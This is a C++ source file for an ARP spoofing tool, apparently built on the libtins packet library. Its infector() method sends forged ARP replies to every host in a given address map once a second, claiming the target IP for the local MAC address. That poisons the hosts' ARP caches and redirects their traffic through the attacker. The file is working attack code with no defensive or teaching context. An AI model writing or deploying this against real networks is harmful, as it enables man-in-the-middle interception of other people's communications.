#include "spoofer.h"
#include <iostream>
#include <unistd.h>

HWAddress<6> Spoofer::getLocal_mac() const
{
    return local_mac;
}

void Spoofer::setLocal_mac(const HWAddress<6> &value)
{
    local_mac = value;
}

IPv4Address Spoofer::getTarget_ip() const
{
    return target_ip;
}

void Spoofer::setTarget_ip(const IPv4Address &value)
{
    target_ip = value;
}

Spoofer::Spoofer()
{
    iface=iface.default_interface();
}

void Spoofer::infector(std::map<IPv4Address, HWAddress<6>> addresses)
{

    EthernetII arp_infection;
    ARP arp;
    while(condition)
    {
        for(const auto elem : addresses)
        {
            //To avoid recursive infection
            if(elem.first==target_ip)
                continue;

            arp_infection=arp.make_arp_reply(elem.first,target_ip,elem.second,local_mac);
            sender.send(arp_infection,iface);
        }
        sleep(1);
    }
}

IPv4Address Spoofer::getLocalIpAddr()
{
    NetworkInterface iface;
    iface=iface.default_interface();

    return iface.ipv4_address();

}

EthernetII::address_type Spoofer::getMacAddr(IPv4Address unknown)
{
    NetworkInterface iface;
    iface=getLocalIpAddr();

    // Why shoud I use try catch?? Am I Coding as java?
    // I want to control myself
    try{
        return Utils::resolve_hwaddr(iface,unknown,sender);
    }catch(...){

        return NULL;
    }

}

void Spoofer::semaphore()
{
    condition=!condition;
}

